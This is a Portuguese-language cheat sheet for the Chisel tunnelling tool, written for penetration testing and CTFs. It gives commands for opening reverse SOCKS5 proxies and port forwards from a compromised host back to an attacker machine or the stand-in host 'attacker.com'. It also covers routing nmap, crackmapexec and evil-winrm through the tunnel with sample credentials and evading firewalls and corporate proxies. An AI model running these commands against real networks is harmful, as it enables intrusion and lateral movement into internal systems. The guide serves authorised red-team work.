<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Cinzel - Folha de dicas completa

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Chisel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Go">
</p>

<p alinhar="centro">
  <b>⚡ Túnel TCP/UDP rápido transportado por HTTP, protegido via SSH, empacotado como um único binário portátil</b>
</p>

---

## 📋 Índice

- [Introdução](#-introdução)
- [Como funciona](#-como-funciona)
- [Instalação](#-instalação)
- [Modos de arquitetura e túnel] (#-arquitetura - modos de túnel)
- [Configuração padrão do Pentest: Proxy SOCKS5 reverso](#-standard-pentest-setup-reverse-socks5-proxy)
  - [Etapa 1: Iniciar servidor no invasor](#etapa-1-iniciar-servidor-no-atacante)
  - [Etapa 2: Conectar o cliente do destino](#step-2-connect-client-from-target)
  - [Etapa 3: Configurar Proxychains](#step-3-configure-proxychains)
  - [Etapa 4: Executar ferramentas no túnel](#step-4-execute-tools-over-the-tunnel)
- [Encaminhamento de porta local](#-encaminhamento de porta local)
- [Encaminhamento de porta remota (capturando tráfego de entrada)](#-remote-port-forwarding- Catching-inbound-traffic)
- [Autenticação e fixação de impressão digital](#-autenticação--fixação de impressão digital)
- [Evasão de saída e encadeamento de proxy HTTP](#-egress-evasion--http-proxy-chaining)
- [Cinzel vs Ligolo-ng vs SSH](#-cinzel-vs-ligolo-ng-vs-ssh)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Dicas e práticas recomendadas](#-dicas--melhores práticas)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)
- [Recursos](#-recursos)

---

## 🎯 Introdução

**Chisel** é uma ferramenta de tunelamento multiplataforma e de código aberto escrita em Go que encapsula sessões SSH seguras em conexões HTTP/WebSocket padrão.

Como o tráfego se parece com a comunicação padrão HTTP/HTTPS ou WebSocket na rede, o Chisel navega facilmente por firewalls restritivos, sistemas Deep Packet Inspection (DPI) e proxies web corporativos que normalmente bloqueariam o tráfego SSH ou VPN bruto.

### Principais pontos fortes

- 🚀 **Binário Único:** Contém servidor e cliente em um binário autônomo compilado estaticamente.
- 🛡️ **Evasão de Firewall:** Túneis na porta padrão 80/443 ou WebSockets para se misturar ao tráfego normal da Web.
- 🔒 **Criptografado por padrão:** Usa criptografia SSH nos bastidores (chaves ECDSA e AES-GCM).
- 🔄 **SOCKS5 e encaminhamento de porta:** Cria proxies SOCKS5 reversos ou portas específicas encaminhadas locais/remotas sem esforço.

---

## 🏗️ Como funciona
```
+------------------------------------+                         +-----------------------------------+
|          Attacker Machine          |                         |       Compromised Target Host     |
|          (192.168.1.100)           |                         |            (Dual-homed)           |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Local Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |        Internal Network Interface |
|      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
+------------------------------------+                         +-----------------------------------+
```
---

## 📥 Instalação

###Kali Linux
```bash
sudo apt update && sudo apt install -y chisel
```
### Da fonte (Ir)
```bash
go install github.com/jpillora/chisel@latest
```
### Baixar binários pré-compilados

Baixe binários independentes para Linux, Windows e macOS dos lançamentos oficiais:
```bash
# Attacker Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Target 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```
---

## 🔄 Configuração padrão do Pentest: proxy reverso SOCKS5

Em testes de penetração padrão e CTFs, a máquina alvo está atrás de NAT/firewalls e não pode aceitar conexões de entrada diretas suas. Você deve criar um **proxy SOCKS5 reverso**.

### Etapa 1: Iniciar o servidor no invasor

Inicie o servidor Chisel escutando na porta `8000` (ou `443` para evasão) com encaminhamento de porta reverso permitido:
```bash
chisel server --reverse -p 8000 -v
```
### Etapa 2: Conectar o cliente do destino

Execute o cliente na máquina comprometida, conectando-se novamente ao IP do invasor e abrindo um proxy SOCKS5 reverso:

#### Destino Linux:
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```
#### Alvo do Windows:
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```
> **Resultado:** O servidor Chisel na máquina do invasor abre a porta `1080` localmente como um proxy SOCKS5 roteado através do alvo!

### Etapa 3: configurar proxychains

Edite `/etc/proxychains4.conf` (ou `/etc/proxychains.conf`) na máquina do invasor:
```ini
[ProxyList]
# protocol  host        port
socks5      127.0.0.1   1080
```
### Etapa 4: Executar ferramentas no túnel

Prefixe qualquer ferramenta com `proxychains` para roteá-la através do host interno comprometido:
```bash
# Nmap TCP Connect scan
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB authentication
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# Evil-WinRM shell to an internal domain controller
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```
---

## 🔀 Encaminhamento de porta local

Encaminhe uma porta interna específica atrás do alvo diretamente para a máquina local do invasor sem precisar de um proxy SOCKS completo.

### Exemplo: Acesso ao Web Service Interno (Porta 80)

Servidor no invasor (`192.168.1.100:8000`):
```bash
chisel server --reverse -p 8000
```
Cliente no alvo:
```bash
# Forward target's internal localhost:80 to attacker's localhost:8080
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```
Agora navegue até `http://127.0.0.1:8080` na máquina do invasor para visualizar o servidor web interno!

### Exemplo: Expor banco de dados interno (MySQL 3306)

Cliente no alvo:
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```
Conecte-se diretamente do terminal do invasor:
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```
---

## 🌐 Encaminhamento de porta remota (capturando tráfego de entrada)

Exponha uma porta na máquina de destino que roteia de volta para um serviço na caixa do invasor (útil para servir cargas ou capturar retornos de chamada).
```bash
# Target opens port 9000, sending incoming connections to attacker's 9000
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```
---

## 🔐 Autenticação e fixação de impressão digital

Em ambientes ativos, as portas abertas do Chisel podem ser invadidas por pessoas não autorizadas. Proteja seu túnel com autenticação:

### Autenticação (`--auth`)
```bash
# Attacker server enforces credentials
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# Target client authenticates
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```
### Fixação de impressão digital (`--fingerprint`)

Quando o servidor é iniciado, ele imprime sua impressão digital de chave pública SSH:
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```
Verifique-o no cliente para evitar a interceptação do MITM:
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```
---

## 🛡️ Evasão de saída e encadeamento de proxy HTTP

Se o destino interno só puder acessar a Internet por meio de um proxy corporativo de autenticação:
```bash
# Route Chisel traffic through an upstream corporate proxy
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```
---

## ⚖️ Chisel vs Ligolo-ng vs SSH

| Recurso | Cinzel | Ligolo-ng | Tunelamento SSH |
|--------|--------|-----------|-----------|
| **Método primário** | SOCKS5 e encaminhamento de porta | Interface TUN (VPN) | SOCKS5 e encaminhamento de porta |
| **Protocolo de Transporte** | HTTP/WebSocket | TLS bruto | SSH (Porta 22) |
| **Evasão de Firewall** | ⭐⭐⭐⭐⭐ Excepcional | ⭐⭐⭐⭐ Muito bom | ⭐⭐ Ruim (Porta 22 geralmente bloqueada) |
| **Requer Root/Admin**| ❌ Não (somente Userland) | ✅ Sim (para criar dispositivo TUN) | ❌ Não |
| **Verificação SYN do Nmap (`-sS`)**| ❌ Não | ✅ Sim | ❌ Não |
| **Suporte UDP** | Parcial (via SOCKS5) | ✅ UDP nativo completo | ❌ Muito limitado |

---

## 📊 Tabela de referência rápida

| Modo | Comando | Finalidade |
|------|---------|---------|
| **Servidor (reverso)** | `chisel server --reverse -p 8000` | Inicie a escuta reversa do servidor em 8000 |
| **Cliente (SOCKS5 reverso)** | `chisel client <IP>:8000 R:1080:socks` | Crie SOCKS5 reverso na porta 1080 do invasor |
| **Cliente (porta de encaminhamento)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | Mapeie a porta 80 do alvo para a 8080 do invasor |
| **Cliente (Expor porta do invasor)** | `chisel client <IP>:8000 4444:127.0.0.1:4444` | Abra a porta 4444 no roteamento de destino para o invasor |
| **Servidor de autenticação** | `chisel server --reverse --auth "u:p" -p 8000` | Exigir credenciais de clientes conectados |
| **Cliente de autenticação** | `chisel client --auth "u:p" <IP>:8000 R:socks` | Conecte-se com credenciais |
| **Ajuste Keep-Alive** | `chisel client --keepalive 10s <IP>:8000 R:socks`| Evitar interrupções de sessão ociosa do firewall |

---

## 💡 Dicas e práticas recomendadas

1. **Use a porta 443 para evasão máxima:**
   Os firewalls geralmente inspecionam o tráfego em portas arbitrárias, como 8000 ou 8080. A execução do servidor Chisel na porta `443` garante que o tráfego pareça idêntico aos WebSockets HTTPS.
2. **Ajuste o tempo limite do Proxychains:**
   Se as conexões proxychains parecerem lentas, edite `/etc/proxychains4.conf` e defina:
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **Não são necessários privilégios de root no destino:**
   Ao contrário das soluções VPN ou TUN, o Chisel funciona exclusivamente no espaço do usuário. Você pode executar `chisel.exe` ou `chisel` como contas de serviço de baixo privilégio (`www-data`, `nobody`, usuário padrão do Windows).

---

## ⚠️ Isenção de responsabilidade legal

> **IMPORTANTE:** O Chisel destina-se a testes de rede autorizados, simulação de equipe vermelha e administração de sistemas. A implantação de ferramentas de tunelamento em redes não autorizadas viola as leis de segurança de computadores.

---

## 📚 Recursos

- [Repositório GitHub do Chisel](https://github.com/jpillora/chisel)
- [Projeto Proxychains-NG](https://github.com/rofl0r/proxychains-ng)